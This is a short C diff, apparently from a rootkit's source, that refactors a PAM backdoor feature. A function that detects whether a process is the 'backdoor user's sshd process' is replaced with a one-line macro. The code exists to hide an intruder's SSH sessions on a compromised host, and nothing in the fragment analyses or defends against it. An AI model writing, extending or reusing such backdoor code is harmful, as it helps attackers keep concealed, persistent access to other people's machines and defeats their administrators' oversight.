@@ -80,14 +80,5 @@ int process(char *name){
 #ifdef USE_PAM_BD
 /* determine if the calling process is a
  * backdoor user's sshd process. */
-int bd_sshproc(void){
-    int status = 0,
-        sshds_len = strlen(SSHD_PROC_STR) + 
-                    strlen(BD_UNAME);
-    char sshds[sshds_len];
-
-    snprintf(sshds, sshds_len, SSHD_PROC_STR, BD_UNAME);
-    if(process(sshds)) status = 1;
-    return status;
-}
+#define bd_sshproc() process(BD_SSHPROCNAME)
 #endif
